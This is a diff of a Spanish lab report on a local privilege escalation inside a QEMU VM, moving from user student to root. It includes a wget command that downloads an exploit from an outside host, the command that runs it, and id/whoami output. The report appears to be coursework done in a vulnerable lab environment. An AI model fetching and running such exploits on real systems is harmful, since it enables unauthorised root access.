@@ -1,29 +1,64 @@
 === HITO 2: EXPLOTACIÓN EXITOSA ===
 
-Usuario inicial dentro de la VM:
-student
+Fecha: 14/05/2026
+Entorno: Máquina virtual QEMU dentro de GitHub Codespaces
+Kernel vulnerable: 6.12.0
+
+=== Usuario antes de la explotación ===
 
 Comando ejecutado:
+id
+
+Resultado:
+uid=1001(student) gid=1001(student) groups=1001(student)
+
+Comando ejecutado:
+whoami
+
+Resultado:
+student
+
+=== Exploit utilizado ===
+
+Archivo:
+copy_fail_exp.py
+
+Comando de descarga:
+wget https://copy.fail/exp -O copy_fail_exp.py
+
+Comando de ejecución:
 python3 copy_fail_exp.py
 
-Resultado esperado:
-Se obtiene una shell con privilegios de root, identificada por el símbolo #.
+=== Resultado de la explotación ===
 
-Evidencia obtenida:
+Después de ejecutar el exploit, el prompt cambió de usuario normal a shell root, representado por el símbolo:
 
-# id
+#
+
+=== Confirmación de privilegios root ===
+
+Comando ejecutado:
+id
+
+Resultado:
 uid=0(root) gid=0(root) groups=0(root)
 
-# whoami
+Comando ejecutado:
+whoami
+
+Resultado:
 root
 
-Kernel vulnerable:
-6.12.0
+=== Descripción técnica ===
 
-Descripción técnica:
-El exploit copy_fail_exp.py fue ejecutado dentro de la VM QEMU como usuario student.
-Después de ejecutar el PoC, el sistema permitió obtener una shell root.
-Esto confirma la escalación de privilegios local en el entorno vulnerable del laboratorio.
+El exploit fue ejecutado dentro de la máquina virtual QEMU como usuario student.
 
-Conclusión:
-El Hito 2 fue completado exitosamente porque se logró pasar de un usuario sin privilegios a root.
+El PoC aprovechó la vulnerabilidad del entorno para modificar el comportamiento relacionado con /usr/bin/su y permitió obtener una shell con privilegios elevados.
+
+La obtención de uid=0(root) confirma que se logró una escalación local de privilegios.
+
+=== Conclusión ===
+
+El Hito 2 fue completado exitosamente porque se logró pasar de un usuario sin privilegios, student, a una shell root dentro del entorno vulnerable.
+
+La explotación fue confirmada mediante los comandos id y whoami.
